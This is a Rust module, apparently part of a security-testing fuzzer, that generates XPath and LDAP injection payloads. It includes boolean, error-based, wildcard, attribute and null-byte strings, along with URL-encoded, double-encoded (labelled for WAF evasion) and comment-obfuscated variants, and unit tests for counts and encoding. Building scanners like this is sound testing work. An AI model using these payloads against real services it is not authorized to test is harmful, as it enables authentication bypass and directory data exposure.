//! XPath and LDAP Payload Generation
//! Generates XPath and LDAP payloads with encoding, comment, and null-byte variations.
//! Implements bounded memory usage for 2GB RAM ceiling compliance.

use std::borrow::Cow;
use std::collections::VecDeque;

/// Bounded XPath/LDAP payload generator
pub struct QueryPayloads {
    payload_queue: VecDeque<Cow<'static, str>>,
    max_payloads: usize,
    mutation_index: usize,
}

impl QueryPayloads {
    pub fn new(max_payloads: usize) -> Self {
        Self {
            payload_queue: VecDeque::with_capacity(max_payloads.min(1024)),
            max_payloads: max_payloads.min(1024),
            mutation_index: 0,
        }
    }

    /// Generate XPath boolean-based payloads
    pub fn xpath_boolean_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "' or '1'='1",
            "\" or \"1\"=\"1",
            "' or 1=1 or ''='",
            "' and '1'='2",
            "' or substring(.,1,1)='a'",
            "' or contains(.,'admin')",
        ].into_iter()
    }

    /// Generate XPath error-based payloads
    pub fn xpath_error_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "' or count(/*)>0 or '",
            "' or name(/*)='root' or '",
            "1' and type-error() and '",
            "' or //user or '",
        ].into_iter()
    }

    /// Generate LDAP parenthesis manipulation payloads
    pub fn ldap_parenthesis_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            ")(",
            ")(uid=*)",
            ")(cn=*)",
            ")(|(uid=*))",
            ")(objectClass=*)",
            "*)(uid=*)(&",
        ].into_iter()
    }

    /// Generate LDAP wildcard payloads
    pub fn ldap_wildcard_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "*",
            "*)(uid=*",
            "*)(cn=admin*",
            "admin*",
            "*admin*",
            "*)(|(uid=*))",
        ].into_iter()
    }

    /// Generate LDAP attribute manipulation payloads
    pub fn ldap_attribute_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "uid=*)(&",
            "cn=*)(&",
            "mail=*)(&",
            "objectClass=*)(&",
            "userPassword=*)(&",
        ].into_iter()
    }

    /// Generate null byte injection payloads
    pub fn null_byte_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "admin\u{0000}",
            "user\u{0000})(uid=*)",
            "test\u{0000})(cn=*)",
            "guest\u{0000})(|(objectClass=*))",
        ].into_iter()
    }

    /// Generate URL-encoded variants
    pub fn url_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.xpath_boolean_payloads()
            .chain(self.ldap_parenthesis_payloads())
            .map(|p| self.url_encode(p))
    }

    /// Generate double-encoded payloads for WAF evasion
    pub fn double_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.url_encoded_payloads().map(|p| self.url_encode(&p))
    }

    /// Generate comment-obfuscated payloads
    pub fn comment_obfuscated_payloads(&self) -> impl Iterator<Item = String> {
        [
            format!("'<!--{}-->' or '1'='1", self.mutation_index),
            format!("'(:{}:)' or '1'='1", self.mutation_index),
            format!("')(uid=*)//comment('", ),
            "'/*comment*/)(uid=*)".to_string(),
        ].into_iter()
    }

    /// Queue a payload for later use
    pub fn queue_payload(&mut self, payload: Cow<'static, str>) {
        if self.payload_queue.len() >= self.max_payloads {
            self.payload_queue.pop_front();
        }
        self.payload_queue.push_back(payload);
    }

    /// Get queued payloads
    pub fn get_queued(&self) -> impl Iterator<Item = &Cow<'static, str>> {
        self.payload_queue.iter()
    }

    /// Mutate a base payload
    pub fn mutate(&mut self, base: &str) -> String {
        self.mutation_index = (self.mutation_index + 1) % 8;
        
        match self.mutation_index {
            0 => base.to_string(),
            1 => format!("{}//comment", base),
            2 => format!("{}/*{}*/", base, self.mutation_index),
            3 => self.url_encode(base),
            4 => base.replace(")", "))").replace("(", "(("),
            5 => base.to_uppercase(),
            6 => format!("{}{}", base, "\u{0000}"),
            _ => base.chars().rev().collect(),
        }
    }

    /// Clear the payload queue
    pub fn clear_queue(&mut self) {
        self.payload_queue.clear();
    }

    /// Get queue size
    pub fn queue_size(&self) -> usize {
        self.payload_queue.len()
    }

    /// Simple URL encoding
    fn url_encode(&self, s: &str) -> String {
        let mut result = String::with_capacity(s.len() * 3);
        for c in s.chars() {
            match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => result.push(c),
                ' ' => result.push_str("%20"),
                '\'' => result.push_str("%27"),
                '"' => result.push_str("%22"),
                '(' => result.push_str("%28"),
                ')' => result.push_str("%29"),
                '*' => result.push_str("%2A"),
                '&' => result.push_str("%26"),
                '|' => result.push_str("%7C"),
                '=' => result.push_str("%3D"),
                '<' => result.push_str("%3C"),
                '>' => result.push_str("%3E"),
                '/' => result.push_str("%2F"),
                '\\' => result.push_str("%5C"),
                '%' => result.push_str("%25"),
                '\u{0000}' => result.push_str("%00"),
                _ => result.push(c),
            }
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xpath_boolean_payloads() {
        let payloads = QueryPayloads::new(100);
        let count: usize = payloads.xpath_boolean_payloads().count();
        assert_eq!(count, 6);
    }

    #[test]
    fn test_ldap_parenthesis_payloads() {
        let payloads = QueryPayloads::new(100);
        let count: usize = payloads.ldap_parenthesis_payloads().count();
        assert_eq!(count, 6);
    }

    #[test]
    fn test_null_byte_payloads() {
        let payloads = QueryPayloads::new(100);
        let count: usize = payloads.null_byte_payloads().count();
        assert_eq!(count, 4);
    }

    #[test]
    fn test_queue_bounded() {
        let mut gen = QueryPayloads::new(3);
        for i in 0..5 {
            gen.queue_payload(Cow::Owned(format!("payload{}", i)));
        }
        assert_eq!(gen.queue_size(), 3);
    }

    #[test]
    fn test_url_encoding() {
        let gen = QueryPayloads::new(100);
        let encoded = gen.url_encode("' or '1'='1");
        assert!(encoded.contains("%27"));
        assert!(encoded.contains("%28") || encoded.contains("%29") || encoded.contains("or"));
    }
}
